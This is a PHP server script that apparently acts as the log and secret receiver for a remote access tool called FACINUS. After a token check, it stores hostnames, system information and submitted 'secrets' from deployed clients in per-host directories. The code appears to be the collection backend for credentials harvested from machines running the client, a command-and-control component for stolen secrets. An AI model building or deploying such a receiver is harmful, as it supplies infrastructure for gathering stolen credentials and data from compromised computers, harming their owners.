<?php
// Log receiver script for FACINUS remote access system
// This script receives logs from deployed clients and stores them securely

// Configuration
$auth_token = "TOKEN_PLACEHOLDER"; // Will be replaced during installation
$logs_dir = __DIR__ . "/admin/logs";
$secrets_dir = __DIR__ . "/admin/secrets";

// Verify authentication token
if (!isset($_POST['auth_token']) || $_POST['auth_token'] !== $auth_token) {
    http_response_code(403);
    die("Access denied");
}

// Get data from request
$hostname = isset($_POST['hostname']) ? filter_var($_POST['hostname'], FILTER_SANITIZE_STRING) : "unknown";
$timestamp = date('Y-m-d_H-i-s');
$system_info = isset($_POST['system_info']) ? $_POST['system_info'] : "{}";
$secret_type = isset($_POST['secret_type']) ? filter_var($_POST['secret_type'], FILTER_SANITIZE_STRING) : "unknown";
$secret_value = isset($_POST['secret_value']) ? $_POST['secret_value'] : "";

// Create hostname-specific directories if they don't exist
$host_logs_dir = $logs_dir . "/" . preg_replace('/[^a-zA-Z0-9_-]/', '_', $hostname);
if (!file_exists($host_logs_dir)) {
    mkdir($host_logs_dir, 0750, true);
}

$host_secrets_dir = $secrets_dir . "/" . preg_replace('/[^a-zA-Z0-9_-]/', '_', $hostname);
if (!file_exists($host_secrets_dir)) {
    mkdir($host_secrets_dir, 0750, true);
}

// Process the file upload if available
if (isset($_FILES['log_data']) && $_FILES['log_data']['error'] === UPLOAD_ERR_OK) {
    $log_file = $host_logs_dir . "/" . $timestamp . "_" . sanitize_filename($_FILES['log_data']['name']);
    if (move_uploaded_file($_FILES['log_data']['tmp_name'], $log_file)) {
        // Process system info if provided
        if (!empty($system_info)) {
            $info_file = $host_logs_dir . "/system_info.json";
            file_put_contents($info_file, $system_info);
        }
        
        // Process secret if provided
        if (!empty($secret_type) && !empty($secret_value)) {
            $secret_file = $host_secrets_dir . "/" . sanitize_filename($secret_type) . ".txt";
            file_put_contents($secret_file, $secret_value);
        }
        
        // Success response
        http_response_code(200);
        echo json_encode(['status' => 'success', 'message' => 'Log received']);
    } else {
        http_response_code(500);
        echo json_encode(['status' => 'error', 'message' => 'Failed to save log file']);
    }
} else {
    // Handle case where no file was uploaded but maybe system info or secrets were sent
    if (!empty($system_info)) {
        $info_file = $host_logs_dir . "/system_info.json";
        file_put_contents($info_file, $system_info);
    }
    
    if (!empty($secret_type) && !empty($secret_value)) {
        $secret_file = $host_secrets_dir . "/" . sanitize_filename($secret_type) . ".txt";
        file_put_contents($secret_file, $secret_value);
        
        // Log this secret submission as well
        $log_entry = date('Y-m-d H:i:s') . " - New {$secret_type} received\n";
        file_put_contents($host_logs_dir . "/secrets_log.txt", $log_entry, FILE_APPEND);
    }
    
    // Response
    if (!empty($system_info) || (!empty($secret_type) && !empty($secret_value))) {
        http_response_code(200);
        echo json_encode(['status' => 'success', 'message' => 'Data received']);
    } else {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'message' => 'No data received']);
    }
}

// Helper function to sanitize filenames
function sanitize_filename($filename) {
    // Remove any character that isn't a letter, number, dot, hyphen or underscore
    return preg_replace('/[^a-zA-Z0-9._-]/', '_', $filename);
}
?>
